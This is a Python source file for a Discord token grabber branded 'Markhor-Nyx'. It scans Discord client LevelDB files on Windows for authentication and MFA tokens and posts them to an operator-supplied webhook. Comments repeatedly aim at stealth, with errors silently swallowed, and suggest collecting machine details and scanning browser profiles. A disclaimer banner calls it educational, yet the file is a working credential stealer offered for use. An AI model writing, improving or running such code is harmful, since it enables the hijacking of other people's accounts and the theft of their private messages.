import os
import re
import json # Not actually used in this version of the script for its primary purpose
import requests

# It's better to handle webhook input more gracefully or make it configurable
# For a standalone tool, asking is fine. If integrated, it might be hardcoded or config file.
# userwh = input("Enter your webhook: ") # We'll make this part of Markhor-Nyx branding if integrated

# --- Markhor-Nyx Branding and Configuration ---
# If this is a standalone script, you might want a banner.
# If integrated into another tool, the parent tool handles branding.
# For now, let's assume it can be run standalone for review.

WEBHOOK_URL = "" # This should be configured securely, NOT hardcoded if distributed.
# For testing, you can set it directly: WEBHOOK_URL = "YOUR_ACTUAL_WEBHOOK_URL"

def print_tool_banner_and_warning():
    # (Similar banner as other tools, focusing on Token Grabber)
    print(colorama.Fore.RED + "*****************************************************************")
    print(colorama.Fore.YELLOW + "          MARKHOR-NYX - DISCORD TOKEN GRABBER UTILITY          ")
    print(colorama.Fore.RED + "*****************************************************************")
    print(colorama.Fore.RED + "\n========================= EXTREME WARNING! =========================")
    print(colorama.Fore.YELLOW + "This tool is for EDUCATIONAL AND AUTHORIZED SECURITY RESEARCH ONLY.")
    print(colorama.Fore.YELLOW + "Grabbing Discord tokens without explicit consent is ILLEGAL and UNETHICAL.")
    print(colorama.Fore.YELLOW + "You are SOLELY responsible for your actions. Use with extreme caution.")
    print(colorama.Fore.RED + "====================================================================\n")


def get_tokens_from_path(path): # Renamed for clarity
    # Corrected path joining for leveldb
    leveldb_path = os.path.join(path, "Local Storage", "leveldb")
    tokens = set() # Use a set to store unique tokens automatically
    
    if not os.path.exists(leveldb_path):
        return list(tokens) # Return empty list if path doesn't exist

    for file_name in os.listdir(leveldb_path):
        if not file_name.endswith((".log", ".ldb")): # Simplified check
            continue
        
        file_path = os.path.join(leveldb_path, file_name)
        try:
            with open(file_path, "r", errors="ignore") as file: # Ensure file is closed
                for line in file:
                    line = line.strip()
                    if not line:
                        continue
                    # Regex for standard tokens and MFA tokens
                    # Standard token: 24 chars . 6 chars . 27-38 chars (length can vary slightly)
                    # MFA token: mfa. + 84 chars
                    # Improved regex to capture tokens more accurately, including newer variable length ones
                    for regex_pattern in (r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{27,38}", r"mfa\.[\w-]{84}"):
                        found_in_line = re.findall(regex_pattern, line)
                        for token in found_in_line:
                            tokens.add(token)
        except Exception:
            # Silently ignore errors during file reading for stealth,
            # but for debugging, you might want to log this.
            pass
            
    return list(tokens) # Convert set to list before returning

def send_to_webhook(webhook_url, tokens_found, user_info=None):
    if not webhook_url:
        print(colorama.Fore.RED + "Webhook URL is not configured. Cannot send tokens.")
        return

    if not tokens_found:
        message_content = "No Discord tokens found on this system."
    else:
        message_content = "Found Discord Token(s):\n" + "\n".join(tokens_found)
    
    # Add more info if available (e.g., username, IP - but IP grabbing adds more ethical concerns)
    if user_info:
        message_content = f"--- User Info ---\n{user_info}\n\n{message_content}"

    payload = {
        "content": message_content,
        "username": "Markhor-Nyx Token Watcher", # Branded username
        "avatar_url": "https://i.imgur.com/r32E73u.png" # Optional: A generic avatar
    }

    try:
        response = requests.post(webhook_url, json=payload, timeout=10)
        if response.status_code >= 400:
            # print(f"Webhook returned error {response.status_code}: {response.text}") # For debugging
            pass # Silently fail on webhook error for stealth
    except requests.exceptions.RequestException:
        # print(f"Failed to send to webhook: {e}") # For debugging
        pass # Silently fail on network error

def find_and_send_tokens(webhook_url_to_use):
    # Using os.getenv("LOCALAPPDATA") is often more reliable than APPDATA for these paths on Windows
    # APPDATA usually points to Roaming, LOCALAPPDATA to Local. Discord often uses Local.
    local_app_data = os.getenv("LOCALAPPDATA")
    app_data_roaming = os.getenv("APPDATA") # Keep for broader search if needed

    # Paths for different Discord clients on Windows
    # Note: Browser token storage is different (SQLite databases in browser profiles) and more complex.
    # This script focuses on desktop client tokens.
    discord_paths = {
        "Discord": os.path.join(local_app_data, "Discord"),
        "Discord Canary": os.path.join(local_app_data, "discordcanary"),
        "Discord PTB": os.path.join(local_app_data, "discordptb"),
        "Discord Development": os.path.join(local_app_data, "discorddevelopment"),
        # Some browsers store tokens in similar LevelDB structures under their profile paths
        # e.g., Chrome: os.path.join(local_app_data, 'Google', 'Chrome', 'User Data', 'Default')
        # Brave: os.path.join(local_app_data, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default')
        # This would significantly expand the scope and complexity.
        
        # Check Roaming as well, just in case, though less common for leveldb
        "Discord (Roaming)": os.path.join(app_data_roaming, "Discord"),
        "Discord Canary (Roaming)": os.path.join(app_data_roaming, "discordcanary"),
        "Discord PTB (Roaming)": os.path.join(app_data_roaming, "discordptb"),
    }
    
    # For other OS (conceptual, would need different paths)
    # if sys.platform == "linux" or sys.platform == "linux2":
    #     discord_paths["Discord (Linux)"] = os.path.join(os.getenv("HOME"), ".config", "discord")
    # elif sys.platform == "darwin": # macOS
    #     discord_paths["Discord (macOS)"] = os.path.join(os.getenv("HOME"), "Library", "Application Support", "discord")


    all_found_tokens = set() # Use a set to avoid duplicates from different paths if token is same

    for client_name, path in discord_paths.items():
        if os.path.exists(path):
            # print(f"Checking {client_name} at {path}...") # For debugging
            tokens_from_this_path = get_tokens_from_path(path)
            if tokens_from_this_path:
                # print(f"Found {len(tokens_from_this_path)} token(s) in {client_name}") # For debugging
                all_found_tokens.update(tokens_from_this_path)
    
    # The .cache~$ file logic seems to be for preventing re-sending already found tokens.
    # This implies the script might be run multiple times on the same system.
    # For a one-shot grab, this cache might not be necessary.
    # If used, ensure proper error handling for file operations.
    
    # For this example, let's simplify and always send what's found,
    # assuming it's a one-time execution or webhook handles duplicates if needed.
    # If you need the caching, it can be re-added with robust error handling.

    # Optional: Get some basic user/system info (be very careful with privacy)
    # pc_username = os.getenv("USERNAME")
    # pc_name = os.getenv("COMPUTERNAME")
    # user_info_str = f"PC User: {pc_username}\nPC Name: {pc_name}"
    
    send_to_webhook(webhook_url_to_use, list(all_found_tokens)) #, user_info=user_info_str)


if __name__ == "__main__":
    # This import should be at the top
    try:
        import colorama
        colorama.init(autoreset=True)
        BANNER_NEEDED = True
    except ImportError:
        class DummyColorama: # Fallback if colorama is not installed
            class Fore:
                RED = YELLOW = BLUE = ""
            class Style:
                RESET_ALL = ""
        colorama = DummyColorama()
        BANNER_NEEDED = False # Avoid printing banner if colors are not available

    if BANNER_NEEDED:
        print_tool_banner_and_warning()

    # --- Webhook Configuration ---
    # In a real scenario, this should NOT be asked directly in a malicious tool.
    # It would be pre-configured or fetched. For an "ethical" tool menu, asking is an option.
    
    # Option 1: Hardcode for testing (NOT FOR DISTRIBUTION)
    # configured_webhook = "YOUR_DISCORD_WEBHOOK_URL_HERE"
    
    # Option 2: Ask the user (as in original script)
    configured_webhook = input(colorama.Fore.BLUE + "Enter your Discord Webhook URL for receiving tokens: ").strip()

    if not configured_webhook:
        print(colorama.Fore.RED + "No webhook URL provided. Exiting.")
        sys.exit(1)
    
    # Basic check for webhook URL structure (can be improved)
    if not configured_webhook.startswith("https://discord.com/api/webhooks/"):
        print(colorama.Fore.RED + "Invalid Discord Webhook URL format.")
        sys.exit(1)

    print(colorama.Fore.YELLOW + "\nAttempting to find and send tokens...")
    try:
        find_and_send_tokens(configured_webhook)
        print(colorama.Fore.GREEN + "Token grabbing process completed. Check your webhook (if tokens were found and sent).")
    except Exception as e:
        # print(f"An error occurred in main execution: {e}") # For debugging
        pass # Silently fail for stealth in a malicious context